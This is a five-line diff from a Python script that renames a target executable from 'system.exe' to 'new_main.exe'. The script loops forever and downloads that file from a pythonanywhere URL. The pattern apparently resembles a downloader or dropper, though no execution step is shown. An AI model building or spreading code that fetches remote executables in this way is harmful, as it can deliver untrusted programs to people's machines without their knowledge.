@@ -1,5 +1,5 @@
 import requests,os,time
-name = "system.exe"
+name = "new_main.exe"
 while True:
     def download():
         url = f"https://pybdtest.pythonanywhere.com/media/files/{name}/"
